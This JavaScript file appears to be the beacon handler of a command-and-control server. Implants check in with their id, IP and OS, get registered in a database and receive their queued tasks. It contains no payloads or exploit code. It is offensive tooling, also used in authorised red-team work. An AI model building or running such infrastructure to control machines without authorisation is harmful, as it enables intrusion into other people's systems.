const express = require("express");
const router = express.Router();
const statusCodes = require("../config/statusCodes");
const { levels, log } = require("../utils/logger");
const { validateBeacon } = require("../validation/request-validation");
const {
  findImplantById,
  addImplant,
  updateImplant,
} = require("../db/services/implant-service");
const {
  getTasksForImplant,
  taskSent,
} = require("../db/services/tasks-service");

router.post("", async (req, res) => {
  log("/beacon", `Received beacon: ${JSON.stringify(req.body)}`, levels.DEBUG);
  let returnStatus = statusCodes.OK;
  let responseJSON = {};

  try {
    const validationResult = validateBeacon(req.body);
    if (validationResult.isValid) {
      const beacon = {
        id: req.body.id,
        ip: req.body.ip,
        os: req.body.os,
        beaconIntervalSeconds: req.body.beaconIntervalSeconds,
        lastCheckinTimeSeconds: Date.now(),
      };

      if ((await findImplantById(beacon.id)) === null) {
        await addImplant(beacon);
      } else {
        await updateImplant(beacon);
      }

      const tasks = await getTasksForImplant(beacon.id, false);
      responseJSON = {
        tasks,
        errors: [],
      };

      await tasks.forEach(async (task) => {
        await taskSent(task._id);
      });
    } else {
      responseJSON = {
        tasks: [],
        errors: validationResult.errors,
      };
      returnStatus = statusCodes.BAD_REQUEST;
    }
  } catch (err) {
    returnStatus = statusCodes.INTERNAL_SERVER_ERROR;
    responseJSON = {
      tasks: [],
      errors: ["Internal Server Error"],
    };
    log("/beacon", err, levels.ERROR);
  }
  return res.status(returnStatus).json(responseJSON);
});

module.exports = router;
